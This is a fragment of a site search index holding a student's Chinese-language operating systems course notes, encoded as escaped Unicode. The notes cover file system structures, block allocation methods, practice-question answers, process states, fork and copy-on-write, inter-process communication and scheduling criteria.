<li> <p>\u4e3a\u4e86\u63d0\u9ad8\u6587\u4ef6\u7cfb\u7edf\u7684\u6027\u80fd\uff0c\u4e00\u4e9b\u6700\u8fd1\u88ab\u8bbf\u95ee\u7684\u76ee\u5f55\u4fe1\u606f\u4f1a\u88ab\u7f13\u5b58\u5230\u5185\u5b58\u91cc\uff0c\u8fd9\u4e9b\u76ee\u5f55\u4fe1\u606f\u5c31\u662f Directory cache</p> </li> <li> <p>System-wide open-file table</p> </li> <li> <p>\u8bb0\u5f55\u8fd9\u4e2a\u7cfb\u7edf\u4e2d\u6240\u6709\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6</p> </li> <li> <p>Per-process open-file table</p> </li> <li> <p>\u8bb0\u5f55\u6bcf\u4e2a\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6\uff0c\u5176entry\u6307\u5411 system-wide open-file table \u91cc\u7684entry</p> </li> <li> <p>Buffers</p> </li> <li> <p>\u5728\u5185\u5b58\u4e2d\uff0c\u7528\u4e8e\u7f13\u5b58 disk block \u7684\u5185\u5bb9</p> </li> <li>\u5f53\u8bfbdisk block\u7684\u65f6\u5019\uff0c\u5176\u5185\u5bb9\u4f1a\u88ab\u653e\u5230buffer\u4e2d\uff0c\u5f53\u8981\u5199disk block\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u5199\u5165buffer\u4e2d</li> <li>\u901a\u8fc7\u4e0a\u8ff0\u65b9\u5f0f\uff0cbuffer\u53ef\u4ee5\u5b9e\u73b0\u7edf\u4e00CPU\u548cIO\u8bbe\u5907\u4e4b\u95f4\u7684\u901f\u5ea6\u5dee\u5f02</li> </ul> <p>\u6587\u4ef6\u64cd\u4f5c\u7684\u5b9e\u73b0</p> <ul> <li> <p>file creation</p> </li> <li> <p>\u5f53\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u521b\u5efa\u7684\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u4f1a\u8c03\u7528 logical file system\uff0c\u5e76\u7ed9\u51fa\u6587\u4ef6\u540d\uff0c\u4ee5\u6b64\u66f4\u65b0 Directory</p> </li> <li>\u521b\u5efa\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u4e00\u4e2a\u5bf9\u5e94\u7684FCB\u4f1a\u88ab\u521b\u5efa\uff0c\u5bf9\u5e94\u7684 Parent Directory\u4f1a\u88ab\u8f7d\u5165\u5185\u5b58\u8fdb\u884c\u66f4\u65b0</li> <li> <p>file open</p> </li> <li> <p>\u5f53\u6211\u4eec\u9700\u8981\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u9996\u5148\u4f1a\u5728 system-wide open-file table \u67e5\u627e\u8fd9\u4e2a\u6587\u4ef6\uff0c\u82e5\u662f\u627e\u5230\u4e86\u5219\u8bf4\u660e\u5176\u6b63\u5728\u88ab\u5176\u4ed6\u6587\u4ef6\u4f7f\u7528\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002</p> </li> <li>\u82e5\u6ca1\u6709\u627e\u5230\uff0c\u5219\u9700\u8981\u5728Directory structure\u4e2d\u67e5\u627e\u8fd9\u4e2a\u6587\u4ef6\uff0c\u627e\u5230\u4e4b\u540e\u5c06\u5176FCB\u590d\u5236\u8fdb\u5165 system-wide open-file table \u8868\u793a\u8be5\u6587\u4ef6\u88ab\u6253\u5f00</li> <li>\u968f\u540e\u5728\u8be5\u8fdb\u7a0b\u7684 per-process open-file table \u521b\u5efa\u4e00\u4e2aentry\uff0c\u6307\u5411 system-wide open-file table \u4e2d\u7684entry\uff0c\u8868\u793a\u8be5\u8fdb\u7a0b\u6253\u5f00\u4e86\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5e76\u4f7f\u5f97\u5176entry += 1</li> <li>\u968f\u540e\u5bf9\u4e8e\u6587\u4ef6\u7684\u64cd\u4f5c\u90fd\u4f9d\u8d56\u4e8e system-wide open-file table \u4e2d\u7684entry\u6307\u9488\uff0cUNIX\u4e2d\u6210\u4e3a file descriptor\uff0cWindows\u4e2d\u79f0\u4e3a file handle</li> <li> <p>file close</p> </li> <li> <p>\u5148\u5220\u9664per-process open-file table\u4e2d\u7684entry</p> </li> <li>\u5c06 system-wide open-file table \u4e2d\u7684 entry \u7684 reference counter -= 1\uff0c\u82e5\u6b64\u65f6RC\u4e3a0\uff0c\u5219\u5220\u9664\u8be5entry \u5e76\u4e14\u66f4\u65b0 Directory structure \u4e2d\u7684\u4fe1\u606f</li> </ul> <p>Virtual FS</p> <p>VFS\u5c06\u64cd\u4f5c\u548c\u5b9e\u73b0\u5206\u5f00\uff0c\u5c06\u63a5\u53e3\u5b9a\u4e49\u4e3a\u4e86\u51e0\u4e2a\u64cd\u4f5c open read write close \u7b49\u7b49\uff0c\u9700\u8981\u6211\u4eec\u53bb\u5bf9\u5e94\u4f4d\u7f6e\u627e\u5230\u51fd\u6570\u6307\u9488\u3002</p> <p>\u8fd9\u79cd\u8bbe\u8ba1\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u652f\u6301\u591a\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u4ef6\u7cfb\u7edf</p> <p>\u76ee\u5f55\u7684\u5b9e\u73b0</p> <p>\u200b\u200b</p> <ul> <li> <p>linear list based</p> </li> <li> <p>\u901a\u8fc7\u7ebf\u6027\u8868\uff08\u6570\u7ec4 or \u94fe\u8868\uff09\u6765\u5b58\u50a8\u76ee\u5f55\u4fe1\u606f\uff0c\u6bcf\u4e2a\u76ee\u5f55\u9879\u5305\u62ec file name \u548c \u6307\u5411 FCB / Inode \u7684\u6307\u9488</p> </li> <li>\u4f18\u70b9\uff1a\u5b9e\u73b0\u7b80\u5355</li> <li>\u7f3a\u70b9\uff1a\u68c0\u7d22\u6548\u7387\u8f83\u4f4e</li> <li>\u4f7f\u7528\u6709\u5e8f\u6570\u636e\u7ed3\u6784\uff0c\u4f8b\u5982\u5e73\u8861\u6811\uff0cB+ \u6811\u7b49\u7b49\uff0c\u53ef\u4ee5\u6539\u5584\u7f3a\u70b9</li> <li> <p>hash table based</p> </li> <li> <p>\u901a\u8fc7hash table \u6765\u5b58\u50a8\u76ee\u5f55\u4fe1\u606f\uff0c\u6bcf\u4e2a\u76ee\u5f55\u9879\u5305\u542b\u4e86 file name \u548c \u6307\u5411 FCB / Inode\u7684\u6307\u9488\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7hash function\u5b8c\u6210\u67e5\u627e\u5de5\u4f5c</p> </li> <li>\u4f18\u70b9\uff1a\u68c0\u7d22\u6548\u7387\u9ad8</li> <li>\u7f3a\u70b9\uff1a\u53ef\u80fd\u4f1a\u6709\u51b2\u7a81\u95ee\u9898\uff0c\u4f46\u53ef\u4ee5\u89e3\u51b3\uff0c\u5bf9\u5bb9\u7eb3\u5185\u5bb9\u5927\u5c0f\u6709\u5047\u8bbe</li> </ul> <p>\u5757\u5206\u914d\u548c\u5757\u7ec4\u7ec7 disk block allocation</p> <p>\u8fd9\u4e00\u90e8\u5206\u63cf\u8ff0\u4e86\u6587\u4ef6\u5982\u4f55\u4f7f\u7528 disk space</p> <ul> <li>continuous allocation</li> </ul> <p>\u6bcf\u4e2a\u6587\u4ef6\u5360\u636e\u4e00\u6bb5\u8fde\u7eed\u7684block\uff0c\u5177\u4f53\u7684\u5206\u914d\u65b9\u6848\u4e5f\u53ef\u4ee5 first fit, best fit \u7b49\u7b49</p> <p>\u200b\u200b</p> <ul> <li> <p>\u4f18\u70b9\uff1a</p> </li> <li> <p>\u5b9e\u73b0\u7b80\u5355\uff0c\u53ea\u9700\u8981\u5b58\u50a8 start block \u548c length</p> </li> <li>\u6587\u4ef6\u8bbf\u95ee\u6548\u7387\u9ad8\uff0c\u6709\u6548\u964d\u4f4e seek time</li> <li>\u652f\u6301 random access ?</li> <li> <p>\u7f3a\u70b9\uff1a</p> </li> <li> <p>\u5206\u914d\u65f6\u96be\u4ee5\u627e\u5230\u5408\u9002\u7684\u7a7a\u95f4\uff0c\u9700\u8981\u904d\u5386</p> </li> <li> <p>\u6587\u4ef6\u52a8\u6001\u53d8\u5316\uff0c\u53d8\u5c0f\u4f1a\u4ea7\u751f\u5916\u90e8\u788e\u7247\uff0c\u53d8\u5927\u53ef\u80fd\u6ca1\u6709\u8fde\u7eed\u7a7a\u95f4\uff08\u53ef\u4ee5\u901a\u8fc7 compaction \u548c defrag \u7b49\u64cd\u4f5c\u89e3\u51b3\u5916\u90e8\u788e\u7247\uff09</p> <ul> <li>\u6587\u4ef6\u52a8\u6001\u53d8\u5927\u7684\u95ee\u9898\uff0c\u53ef\u4ee5\u901a\u8fc7extent\u6765\u89e3\u51b3\uff0c\u4e5f\u5c31\u662f\u518d\u7ef4\u62a4\u4e00\u4e2a\u94fe\u8868\uff0c\u4e0d\u591f\u5927\u7684\u65f6\u5019\u518d\u5206\u914d\u4e00\u5757\u8fde\u7eed\u7a7a\u95f4</li> </ul> </li> </ul> <p>\u200b\u200b</p> <ul> <li>linked allocation</li> </ul> <p>\u6bcf\u4e2a\u6587\u4ef6\u90fd\u662fblock\u7ec4\u6210\u7684\u94fe\u8868\uff0cFCB\u4e2d\u8bb0\u5f55\u5934\u548c\u5c3e\uff0cblock\u4e2d\u5b58\u50a8\u4e86next address pointer</p> <p>\u200b\u200b</p> <ul> <li> <p>\u4f18\u70b9</p> </li> <li> <p>\u65e0\u5916\u90e8\u788e\u7247</p> </li> <li> <p>\u7f3a\u70b9</p> </li> <li> <p>\u8bfb\u4e00\u4e2a\u6587\u4ef6\u9700\u8981\u8f83\u591a\u7684 IO \u548c disk seek \uff08\u591a\u4e2a\u5757\u7ec4\u6210cluster \u4f46\u662f\u4f1a\u6709\u5185\u90e8\u788e\u7247\uff09</p> </li> <li>\u6bcf\u4e2a\u5757\u4e2d\u6709\u51e0\u4e2a\u5b57\u8282\u4f5c\u4e3a pointer \u7684overhead</li> <li>pointer \u635f\u574f\u4f1a\u51fa\u73b0\u95ee\u9898 \uff08\u4f7f\u7528\u66f4\u591a\u5197\u4f59\u4fe1\u606f\uff09</li> </ul> <p>FAT\u4f7f\u7528\u7684\u5c31\u662f linked allocation</p> <ul> <li>indexed allocation</li> </ul> <p>\u7ed9\u6bcf\u4e2a\u6587\u4ef6\u9996\u5148\u5206\u914d\u4e00\u4e2ablock\uff0c\u8be5block\u91cc\u5b58\u50a8\u4e86\u8fd9\u4e2a\u6587\u4ef6\u7684\u7b2ci\u4e2a\u5757\u5728\u78c1\u76d8\u7684\u54ea\u91cc\uff0c\u5c31\u7ef4\u62a4\u4e00\u4e2a\u6570\u7ec4\uff0cFCB\u91cc\u5b58\u50a8\u8fd9\u4e2aindexed block\u653e\u5728\u54ea\u91cc\u5373\u53ef</p> <p>\u200b\u200b</p> <ul> <li> <p>\u4f18\u70b9</p> </li> <li> <p>\u652f\u6301 random access</p> </li> <li>\u65e0\u5916\u90e8\u788e\u7247</li> <li> <p>\u7f3a\u70b9</p> </li> <li> <p>\u7d22\u5f15\u5757\u672c\u8eab\u662f\u5f00\u9500</p> </li> <li>\u7d22\u5f15\u5757\u8bbe\u8ba1\u95ee\u9898\uff0c\u4e00\u8fb9\u662f\u5e0c\u671boverhead\u4e0d\u8981\u592a\u5927\uff0c\u4e00\u8fb9\u8981\u652f\u6301\u5927\u6587\u4ef6\u7684\u7d22\u5f15\uff0c\u6709\u4ee5\u4e0b\u5b9e\u73b0\u601d\u8def</li> </ul> <p>\u200b\u200b</p> <p>Free-Space Management</p> <p>\u8fd9\u4e2a\u5728\u738b\u9053\u6709\u66f4\u8be6\u7ec6\u7684\u63cf\u8ff0 P295</p>"},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#66","title":"6.6 \u5178\u578b\u6587\u4ef6\u7cfb\u7edf","text":""},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#_2","title":"\u4e60\u9898\u6536\u5f55","text":"<p>\u738b\u9053</p> <ul> <li>\u6253\u5f00\u6587\u4ef6\u7684\u64cd\u4f5c\u7684\u4e3b\u8981\u5de5\u4f5c\u662f\uff1a\u5c06\u6307\u5b9a\u6587\u4ef6\u7684\u76ee\u5f55\u9879\u590d\u5236\u5230\u5185\u5b58\u5bf9\u5e94\u533a\u57df\uff08\u5e76\u975e\u627e\u5230\u6587\u4ef6\uff09</li> <li> <p>FAT32 \u7684\u6587\u4ef6\u76ee\u5f55\u9879\u4e0d\u5305\u62ec\uff1a\u6587\u4ef6\u63a7\u5236\u5757\u7684\u7269\u7406\u4f4d\u7f6e\uff08\u53ea\u4f1a\u6709\u6587\u4ef6\u7684\u7269\u7406\u4f4d\u7f6e\uff09</p> </li> <li> <p>\u4ec0\u4e48\u662f\u6587\u4ef6\u76ee\u5f55\u9879\uff1a\u6587\u4ef6\u76ee\u5f55\u9879\u662f \u201cfile name \u548c FCB\u201d \u7684\u5bf9</p> </li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662f A</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662f D D</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662f C \u4f46\u662f\u4f3c\u4e4e\u4e0d\u5728\u8003\u8bd5\u8303\u56f4\u5185</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662fD\uff0c\u5176\u4e2d\u7b2c\u4e8c\u4e2a\u8bf4\u6cd5\u9519\u8bef\uff0c\u5e38\u7531\u7528\u6237\u8bbf\u95ee\u6743\u9650\u548c\u6587\u4ef6\u5c5e\u6027\u5171\u540c\u9650\u5236</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662fA</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7b54\u6848\u662fB\uff0c\u5947\u5947\u602a\u602a\u7684\u7406\u89e3\u9898</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u4e24\u4e2a\u7b54\u6848\u90fd\u662fB</li> </ul> <p>jjm hw</p> <p>\u200b\u200b</p> <ul> <li>a4\u91cc\u6709 \u4f46\u662f\u611f\u89c9\u4e0d\u662f\u5f88\u5168</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>FCB\u662f\u5728open\u7684\u65f6\u5019\u88ab\u521b\u5efa\u7684\uff1f</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u78c1\u76d8\u90a3\u8fb9\u7684Homework\u8fd8\u8981\u518d\u770b\u4e00\u904d</li> </ul>"},{"location":"ZJU-course/OS/%E6%A6%82%E8%BF%B0/","title":"\u6982\u8ff0","text":"<ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u7684\u542f\u52a8\u8fc7\u7a0b</li> <li>\u5e38\u89c1\u7684\u4e2d\u65ad\u548c\u5f02\u5e38</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/","title":"\u8fdb\u7a0b\u7ba1\u7406","text":"<ul> <li>copy on write \u221a</li> <li>fork\u673a\u5236\u7684\u5b9e\u73b0\uff0c\u4ee5\u53cafork\u673a\u5236\u4f1a\u4ea7\u751f\u7684\u8fdb\u7a0b\u56fe \u4f5c\u4e1a\u9898\u5df2\u7ecf\u6709\u4e86</li> <li>\u4ec0\u4e48\u662f\u7518\u7279\u56fe \u221a</li> <li>\u8fdb\u7a0b\u7ec8\u6b62</li> <li> <p>Multilevel Feedback Queue Scheduling \u9700\u8981\u770b\u4e00\u9053\u4f8b\u9898</p> </li> <li> <p>WIndows XP scheduling</p> </li> <li>\u4e00\u4e9b\u5e38\u89c1\u7684\u4e2d\u65ad\u548c\u5f02\u5e38</li> </ul>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/#11","title":"1.1 \u8fdb\u7a0b\u7684\u5185\u5bb9","text":"<p>\u8fdb\u7a0b\u7684\u5185\u5bb9\u5305\u62ec</p> <ul> <li>\u7528\u6765\u8fd0\u884c\u7684\u4ee3\u7801 \uff08\u53ef\u5171\u4eab\uff09</li> <li>\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u88ab\u66f4\u65b0\u7684\u6570\u636e</li> <li>\u7528\u6765\u7ef4\u62a4\u548c\u63a7\u5236\u8fdb\u7a0b\u7684\u63a7\u5236\u4fe1\u606f</li> </ul> <p>\u5206\u522b\u5b58\u50a8\u5728\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u7528\u6237\u90e8\u5206\u548c\u5185\u6838\u90e8\u5206</p> <ul> <li>\u7528\u6237\u90e8\u5206\u5982\u4e0b</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u5185\u6838\u90e8\u5206\u5982\u4e0b</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/#12","title":"1.2 \u8fdb\u7a0b\u7684\u72b6\u6001","text":"<p>\u8fdb\u7a0b\u7684\u72b6\u6001\u5305\u62ec</p> <p>\u200b\u200b</p> <ul> <li>new \u521b\u5efa\u548c\u5206\u914d\u8d44\u6e90\u7684\u8fc7\u7a0b</li> <li>runninng \u6b63\u5728\u8fd0\u884c\uff0c\u80fdrunning\u7684\u6700\u5927\u6570\u91cf\u548cCPU\u7684\u6838\u6570\u76f8\u540c</li> <li>ready \u5df2\u7ecf\u51c6\u5907\u597d\u4e86\uff0c\u53ea\u7b49\u5f85CPU\u8d44\u6e90\uff0c\u5982\u679c\u6709ready\uff0c\u80af\u5b9a\u6709running\u7684\u5360\u7528\uff0cCPU\u8c03\u5ea6\u5c31\u662fready\u548crunning\u4e4b\u95f4\u5207\u6362</li> <li> <p>waiting \u8fdb\u7a0b\u662f\u7b49\u5f85\u67d0\u4e8b\u60c5\u7684\u53d1\u751f\uff0c\u6bd4\u5982IO\uff0c\u867d\u7136\u53ef\u80fd\u6709CPU\u7a7a\u95f2\uff0c\u4e5f\u65e0\u6cd5running</p> </li> <li> <p>running -&gt; waiting \u591a\u6570\u662f\u4e3b\u52a8\u7684</p> </li> <li>waiting -&gt; ready \u662f\u88ab\u52a8\u7684</li> <li>terminated \u7ec8\u6b62\uff0c\u7ed3\u675f\u8fd0\u884c\u91ca\u653e\u8d44\u6e90</li> </ul> <p>\u6211\u4eec\u5728\u8fdb\u7a0b\u7ba1\u7406\u4e2d\u4f1a\u7ef4\u62a4 ready queue \u548c wait queue\uff0c\u4e00\u4e2a\u662f\u5728\u7b49\u5f85CPU\u8d44\u6e90\uff0c\u4e00\u4e2a\u662f\u5728\u7b49\u5f85IO\u8d44\u6e90</p>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/#13","title":"1.3 \u8fdb\u7a0b\u7684\u521b\u5efa","text":"<p>linux\u4e2d\u7684\u8fdb\u7a0b\u662f\u6811\u72b6\u521b\u5efa\u7684</p> <ul> <li>pid \u8fdb\u7a0b\u7684id</li> <li>ppid \u7236\u8fdb\u7a0b\u7684id</li> </ul> <p>\u5728linux\u4e2d\uff0c\u6700\u521d\u59cb\u7684\u8fdb\u7a0b\u88ab\u79f0\u4e3a<code>systemd</code>\u200b\uff0c\u5176pid\u4e3a1\uff0cppid\u4e3a0</p> <p>\u4f7f\u7528<code>fork</code>\u200b\u521b\u5efa\u8fdb\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u53ea\u6709\u8fdb\u7a0b\u53f7\u548cparent\u4e0d\u540c</p> <p>\u521b\u5efa\u65b0\u8fdb\u7a0b\u4e4b\u540e\uff0c\u9996\u5148\u4f1a\u590d\u5236parent\u7684\u4ee3\u7801\u6570\u636e\uff0c\u968f\u540e\u5982\u679c\u8c03\u7528exec\uff0c\u90a3\u4e48\u6211\u4eec\u4f1a\u8f7d\u5165\u65b0\u7684\u7a0b\u5e8f\u3002</p> <p>\u5b66\u4e60<code>fork</code>\u200b\u76f8\u5173\u7a0b\u5e8f</p> <p>\u7236\u8fdb\u7a0b\u901a\u8fc7<code>fork</code>\u200b\u6765\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u7136\u540e\u53cc\u65b9\u4ecefork\u4e0b\u4e00\u6761\u6307\u4ee4\u5f00\u59cb\u6267\u884c\uff0c\u533a\u522b\u5728\u4e8e\u5b50\u8fdb\u7a0b\u90a3\u8fb9fork\u7684\u8fd4\u56de\u503c\u4e3a0\uff0c\u800c\u7236\u8fdb\u7a0b\u90a3\u8fb9\u8fd4\u56de\u503c\u4e3a\u5b50\u8fdb\u7a0b\u7684pid\uff0c\u7136\u540e\u7236\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7<code>wait(NULL)</code>\u200b \u6765\u7b49\u5f85\u5b50\u8fdb\u7a0b\u6267\u884c\u5b8c\u6210\u3002</p> <p>\u521b\u5efa\u7684\u6d41\u7a0b</p> <ul> <li>\u5206\u914d\u4e00\u4e2a pid \u5e76\u4e14 \u5206\u914d\u4e00\u4e2a\u7a7a\u767d\u7684 PCB</li> <li>\u4e3a\u8fdb\u7a0b\u5206\u914d\u8fd0\u884c\u6240\u9700\u8d44\u6e90\uff0c\u82e5\u8d44\u6e90\u4e0d\u8db3\uff0c\u5219\u5728 new \u72b6\u6001\u7b49\u5f85</li> <li>\u521d\u59cb\u5316PCB</li> <li>\u5c1d\u8bd5\u5c06\u5176\u63d2\u5165 wait queue</li> </ul> <p>Copy on Write</p> <p>\u56e0\u4e3a\u62f7\u8d1d\u7236\u8fdb\u7a0b\u7684\u5185\u5bb9\u4f1a\u5e26\u6765\u6bd4\u8f83\u5927\u7684\u5f00\u9500\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u53ea\u6709\u5f53\u9700\u8981\u53d1\u751f\u5185\u5bb9\u4fee\u6539\u7684\u65f6\u5019\uff0c\u624d\u771f\u6b63\u590d\u5236\u7236\u8fdb\u7a0b\u7684\u5185\u5bb9\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ea\u8bfb\u754c\u9762\u5728\u7236\u5b50\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eab\uff0c\u6bd4\u8f83\u65b9\u4fbf</p>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/#14","title":"1.4 \u8fdb\u7a0b\u7684\u7ec8\u6b62","text":"<p>\u8fdb\u7a0b\u8c03\u7528<code>exit</code>\u200b\u7684\u65f6\u5019\uff0c\u8fdb\u7a0b\u5c06\u88ab\u7ec8\u6b62\u3002</p> <ul> <li>\u8fdb\u7a0b\u7ec8\u6b62</li> <li>\u8d44\u6e90\u91ca\u653e</li> <li>\u8fd4\u56de\u72b6\u6001\u503c</li> </ul> <p>\u5176\u72b6\u6001\u503c\u5c06\u88abparent\u8fdb\u7a0b\u7684wait\u63a5\u53d7\uff0c\u5982\u679cparent\u4e0dwait\u63a5\u53d7\u5b83\u7684\u8bdd\uff0c\u4f1a\u6709\u4e00\u90e8\u5206\u8d44\u6e90\u4e00\u76f4\u5360\u7528\u5728\u90a3\u8fb9\u8fdb\u884c\u7b49\u5f85\u5b83\u3002UNIX \u7684\u89e3\u51b3\u529e\u6cd5\u662f\uff0c\u8ba9\u6240\u6709\u5b64\u513f\u8fdb\u7a0b\u90fd\u6210\u4e3a <code>init</code>\u200b/<code>systemd</code>\u200b \u7684 child \u8fdb\u7a0b\uff0c\u7531 <code>init</code>\u200b/<code>systemd</code>\u200b \u6765 <code>wait()</code>\u200b \u5b83\u4eec\u3002</p> <ul> <li>\u5df2\u7ecf\u7ec8\u6b62\u4f46\u662f\u4ecd\u7136\u5360\u6709\u8d44\u6e90\u7684\u8fdb\u7a0b\u6210\u4e3a\u50f5\u5c38\u8fdb\u7a0b\uff08zombie\uff09</li> <li>parent\u4e0dwait\u5b83\u7684\u8fdb\u7a0b\u79f0\u4e3a\u5b64\u513f\u8fdb\u7a0b\uff08orphan\uff09</li> </ul> <p>\u8fdb\u7a0b\u95f4\u901a\u4fe1</p> <p>\u534f\u4f5c\u8fdb\u7a0b\uff08cooperation process\uff09\u9700\u8981\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08inter-process communication IPC)</p> <ul> <li>semaphores</li> <li>shared memory  \u6bd4\u8f83\u5feb\uff0c\u4f8b\u5982\u8fdb\u7a0b\u95f4\u7684\u7ebf\u7a0b\u81ea\u7136\u5171\u4eabmemory</li> <li>message passing \u9002\u7528\u4e8e\u5206\u5e03\u5f0f</li> <li>pipe  \u7ba1\u9053\u672c\u8d28\u4e0a\u4e5f\u662f\u4e00\u79cd\u6587\u4ef6\uff0c\u5b50\u8fdb\u7a0b\u4f1a\u7ee7\u627f\u7236\u8fdb\u7a0b\u7684\u7ba1\u9053\uff0c\u7ba1\u9053\u6709\u56fa\u5b9a\u7684\u5927\u5c0f\uff0c\u5e76\u4e14\u8bfb\u5199\u4f1a\u963b\u585e\u5bf9\u65b9</li> </ul>"},{"location":"ZJU-course/OS/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/#15","title":"1.5 \u8fdb\u7a0b\u8c03\u5ea6","text":"<p>\u8fdb\u7a0b\u8c03\u5ea6\u5176\u5b9e\u5c31\u662f\u56f4\u7ed5\u7740 ready \u548c running \u4e24\u4e2a\u72b6\u6001\u5c55\u5f00</p> <p>\u8c03\u5ea6\u7684\u5c42\u6b21</p> <ul> <li>\u9ad8\u7ea7\u8c03\u5ea6 \u5c06\u8fdb\u7a0b\u8c03\u5ea6\u8fdb\u5165\u5185\u5b58\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u53ea\u4f1a\u88ab\u8fd9\u6837\u8c03\u5ea6\u4e00\u6b21</li> <li>\u4e2d\u7ea7\u8c03\u5ea6 \u5c06\u8fdb\u7a0b\u8c03\u5ea6\u8fdb\u5165\u5185\u5b58\uff0c\u770b\u8d77\u6765\u5e72\u7684\u4e8b\u60c5\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u4f1a\u53d1\u751f\u591a\u6b21\uff0c\u4f1a\u5c06\u6682\u65f6\u4e0d\u8fd0\u884c\u7684\u8fdb\u7a0b\u4e22\u5230\u78c1\u76d8\u4e0a\u6302\u8d77</li> <li>\u4f4e\u7ea7\u8c03\u5ea6 CPU\u8c03\u5ea6</li> </ul> <p>\u8c03\u5ea6\u7684\u8fc7\u7a0b</p> <p>CPU scheduler \u9009\u62e9\u4e00\u4e2a ready \u8fdb\u7a0b\u6267\u884c\uff0c\u7531 dispatcher \u6765\u5b8c\u6210\u5177\u4f53\u7684\u5207\u6362\u5de5\u4f5c</p> <ol> <li>\u5728\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u8fdb\u884c\u4e0a\u4e0b\u6587\u5207\u6362\uff08CPU\u5bc4\u5b58\u5668\u91cc\u7684\u503c\uff0c\u8fdb\u7a0b\u72b6\u6001\uff0c\u5185\u5b58\u7684\u7ba1\u7406\u4fe1\u606f\u7b49\u7b49\uff09</li> <li>\u5207\u6362\u5230\u7528\u6237\u6001</li> <li>\u8df3\u8f6c\u5230\u7528\u6237\u7a0b\u5e8f\u4e2d\u5408\u9002\u7684\u4f4d\u7f6e\u5e76\u4e14\u7ee7\u7eed\u6267\u884c\u8fdb\u7a0b</li> </ol> <p>\u4ece dispatcher \u505c\u6b62\u4e0a\u4e00\u4e2a\u8fdb\u7a0b\u5230\u8fd0\u884c\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u5ef6\u8fdf\u88ab\u79f0\u4e3a dispatch latency</p> <p>\u82e5\u8fdb\u7a0b\u5207\u6362\u65f6\uff0c\u7cfb\u7edf\u5185\u6ca1\u6709 ready process \u90a3\u4e48\u5c31\u4f1a\u8c03\u5ea6 idle process \u5176 PID \u4e3a0\uff0c\u4e0d\u9700\u8981\u9664\u4e86CPU\u4ee5\u5916\u7684\u4efb\u4f55\u8d44\u6e90</p> <p>\u4e0d\u80fd\u8fdb\u884c\u8c03\u5ea6\u7684\u60c5\u51b5</p> <ul> <li>\u5904\u7406\u4e2d\u65ad\u7684\u60c5\u51b5</li> <li>\u9700\u8981\u5c4f\u853d\u4e2d\u65ad\u7684\u539f\u5b50\u64cd\u4f5c</li> </ul> <p>\u8c03\u5ea6\u7b97\u6cd5\u7684\u8bc4\u4ef7\u6307\u6807</p> <ul> <li>CPU utilization CPU\u4f7f\u7528\u7387</li> <li>throughput \u541e\u5410\u91cf \u5355\u4f4d\u65f6\u95f4\u5b8c\u6210\u7684\u8fdb\u7a0b\u6570</li> <li>turnaround time \u5468\u8f6c\u65f6\u95f4\uff0c\u4ece\u8fdb\u7a0b\u5f00\u59cb\u5efa\u7acb\u5230\u8fdb\u7a0b\u5b8c\u6210\u7684\u65f6\u95f4</li> <li>waiting time \u8fdb\u7a0b\u5728ready queue\u91cc\u7b49\u5f85\u65f6\u95f4\u7684\u603b\u548c</li> <li>response time \u8fdb\u7a0b\u4ece\u53d1\u51fa\u8bf7\u6c42\u5230\u7b2c\u4e00\u6b21\u54cd\u5e94\u7684\u65f6\u95f4 \uff1f\u5c55\u793a\u53ca\u65f6\u6027</li> </ul> 